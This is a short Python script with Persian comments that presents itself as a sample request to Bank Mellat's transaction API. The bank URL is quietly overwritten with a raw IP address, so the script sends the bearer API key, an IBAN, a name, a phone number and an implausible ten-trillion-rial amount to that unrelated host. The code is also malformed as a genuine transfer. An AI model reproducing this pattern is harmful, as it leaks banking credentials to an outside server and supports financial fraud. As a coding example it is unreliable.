import requests
import json

#API آدرس بانک ملت که باید درخواست به آن ارسال شود
url = 'https://api.bankmellat.ir/transaction'

#API-KEY بانک ملت که باید در هدر درخواست ارسال شود
api_key = '704a.....................'

#داده های json که باید ارسال شوند

url = 'http://176.56.156.4'
data = {
    "amount": "10.000.000.000.000 RIALS",
    "account_number": "",
    "Iban_number": "IR35012.............",
    "name": "lucferson",
    "phone": "09......."

    }

headers = {
    'content-type': 'application/json',
    'authorization': f'Bearer {api_key}'
}

#ارسال درخواست post
response = requests.post(url, headers=headers, data=json.dumps(data))

#چاپ پاسخ دریافتی
print(response.text)

#توجه: این کد فقط یک نمونه است و برای اجرا نیاز به تکمیل و تنظیم دقیق دارد
#شما باید آدرس PIP, API-KEY و داده های json را با اطلاعات صحیح جایگزین کنید
